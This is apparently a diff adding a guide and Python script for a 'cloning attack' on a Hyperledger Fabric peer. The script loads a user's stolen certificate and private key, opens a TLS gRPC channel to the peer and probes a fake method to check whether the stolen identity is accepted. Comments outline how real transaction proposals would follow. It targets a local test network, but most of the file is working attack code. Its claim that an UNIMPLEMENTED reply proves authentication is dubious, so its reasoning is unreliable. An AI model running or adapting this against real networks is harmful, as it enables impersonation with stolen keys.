@@ -1,0 +1,147 @@
+Prerequisites
+
+You will only need the standard grpcio package, which is the core gRPC library for Python, not the Fabric-specific one.
+
+bash
+pip install grpcio
+You still need the connection profile and the stolen credentials (cert.pem and priv_sk) from the target Fabric network
+
+The Raw gRPC Cloning Attack Script
+
+This script will connect to the peer's gRPC endpoint, attempt to establish an authenticated session using the stolen TLS credentials, and then "pretend" to send a transaction proposal by calling a generic gRPC method.
+
+import os
+import sys
+import argparse
+import ssl
+import grpc
+import hashlib
+from datetime import datetime
+
+# --- Configuration ---
+# Path to the connection profile and stolen credentials
+CONNECTION_PROFILE_PATH = os.path.join(
+    os.getcwd(), "fabric-samples", "test-network", "organizations", "peerOrganizations", "org1.example.com", "connection-org1.json"
+)
+STOLEN_CERT_PATH = os.path.join(
+    os.getcwd(), "fabric-samples", "test-network", "organizations", "peerOrganizations", "org1.example.com", "users", "User1@org1.example.com", "msp", "signcerts", "cert.pem"
+)
+STOLEN_KEY_PATH = os.path.join(
+    os.getcwd(), "fabric-samples", "test-network", "organizations", "peerOrganizations", "org1.example.com", "users", "User1@org1.example.com", "msp", "keystore", "priv_sk"
+)
+
+# Target peer's gRPC address
+PEER_ENDPOINT = "localhost:7051"
+
+
+def parse_arguments():
+    """Parse command line arguments."""
+    parser = argparse.ArgumentParser(description="Raw gRPC Hyperledger Fabric Cloning Attack Simulation")
+    parser.add_argument("--endpoint", required=False, default=PEER_ENDPOINT, help="Target peer's gRPC endpoint (host:port).")
+    parser.add_argument("--cert", required=False, default=STOLEN_CERT_PATH, help="Path to the stolen user certificate.")
+    parser.add_argument("--key", required=False, default=STOLEN_KEY_PATH, help="Path to the stolen user private key.")
+    parser.add_argument("--profile", required=False, default=CONNECTION_PROFILE_PATH, help="Path to the network connection profile.")
+    return parser.parse_args()
+
+
+def load_credential_files(cert_path: str, key_path: str) -> tuple[str, str]:
+    """Load the certificate and private key from files."""
+    print(f"[*] Loading stolen credentials...")
+    try:
+        with open(cert_path, "r") as f:
+            certificate = f.read()
+        with open(key_path, "r") as f:
+            private_key = f.read()
+        print("[+] Credentials loaded successfully.")
+        return certificate, private_key
+    except FileNotFoundError as e:
+        print(f"[!] Error: Could not find credential file: {e.filename}")
+        sys.exit(1)
+
+
+def main():
+    """Main function to execute the raw gRPC cloning attack."""
+    args = parse_arguments()
+    print("--- Raw gRPC Hyperledger Fabric Cloning Attack Simulation ---")
+    print(f"[*] Target Peer Endpoint: {args.endpoint}")
+    print(f"[*] Using Stolen Certificate: {args.cert}")
+    print(f"[*] Using Stolen Private Key: {args.key}")
+    print("-" * 50)
+
+    # 1. Load the stolen credentials
+    certificate_pem, private_key_pem = load_credential_files(args.cert, args.key)
+
+    # 2. Create gRPC credentials from the stolen identity.
+    # This is the core of the impersonation. We are using the user's cert and key
+    # to create a secure channel, as if we were the legitimate client.
+    try:
+        print("[*] Creating gRPC SSL channel credentials from the stolen identity...")
+        # Fabric peers use TLS. We create a channel using the user's identity.
+        # In a real Fabric call, these credentials are used for both TLS and
+        # for signing the transaction payload itself.
+        ssl_credentials = grpc.ssl_channel_credentials(
+            root_certificates=None, # In a real scenario, you'd load the peer's TLS CA cert here
+            private_key=private_key_pem.encode('utf-8'),
+            certificate_chain=certificate_pem.encode('utf-8')
+        )
+        print("[+] gRPC credentials created successfully.")
+    except Exception as e:
+        print(f"[!] Error creating gRPC credentials: {e}")
+        print("[!] Ensure the private key and certificate are in valid PEM format.")
+        sys.exit(1)
+
+    # 3. Establish the gRPC channel and attempt to interact
+    with grpc.secure_channel(args.endpoint, ssl_credentials) as channel:
+        try:
+            print(f"[*] Connecting to peer at {args.endpoint}...")
+            grpc.channel_ready_future(channel).result(timeout=10) # Wait for channel to be ready
+            print("[+] gRPC channel established successfully. Attacker is now connected.")
+
+            # --- SIMULATED MALICIOUS ACTION ---
+            # In a real attack, you would now use the channel to create a stub for a
+            # Fabric service (e.g., protos.Endorser) and send a serialized
+            # transaction proposal (a protobuf message).
+            #
+            # Since we don't have the protobuf definitions, we will simulate this
+            # by attempting to call a non-existent method. The goal is to see
+            # if the authentication (TLS handshake) passes.
+            #
+            # A successful TLS handshake followed by a "Method not found" error
+            # from the server proves that the attacker's identity was accepted
+            # by the peer, which is the critical step in a cloning attack.
+
+            print("\n[*] Simulating a malicious transaction call...")
+            print("[!] Note: We are calling a fake method to test authentication.")
+            
+            # This will fail because the method doesn't exist, but if the error
+            # is gRPC.StatusCode.UNIMPLEMENTED or UNKNOWN, it means the
+            # authentication and TLS handshake were successful.
+            channel.unary_unary(
+                '/protos.MyFakeService/FakeMethod', # A fake service/method
+                request_serializer=bytes, # Dummy serializer
+                response_deserializer=bytes # Dummy deserializer
+            )(b'fake_payload')
+
+        except grpc.RpcError as e:
+            # This is the expected outcome of our simulation.
+            if e.code() == grpc.StatusCode.UNIMPLEMENTED:
+                print("\n[+] SIMULATION SUCCESSFUL!")
+                print("[+] The peer responded with 'UNIMPLEMENTED' (Method not found).")
+                print("[+] This indicates the TLS handshake and authentication using the stolen credentials SUCCEEDED.")
+                print("[+] The attacker is now a valid, authenticated client and can send real transactions if they had the protobuf definitions.")
+            elif e.code() == grpc.StatusCode.UNAVAILABLE:
+                print(f"\n[!] Connection failed: {e.details()}")
+                print("[!] This could mean the peer is down, the endpoint is wrong, or there's a TLS issue (e.g., peer expects a client CA cert that wasn't provided).")
+            elif e.code() == grpc.StatusCode.PERMISSION_DENIED:
+                print(f"\n[!] Authentication FAILED: {e.details()}")
+                print("[!] The peer rejected the stolen credentials. The identity is not valid.")
+            else:
+                print(f"\n[!] An unexpected gRPC error occurred: {e.code()} - {e.details()}")
+        except Exception as e:
+            print(f"\n[!] An unexpected error occurred: {e}")
+        finally:
+            print("\n[*] Attacker disconnecting.")
+
+
+if __name__ == "__main__":
+    main()
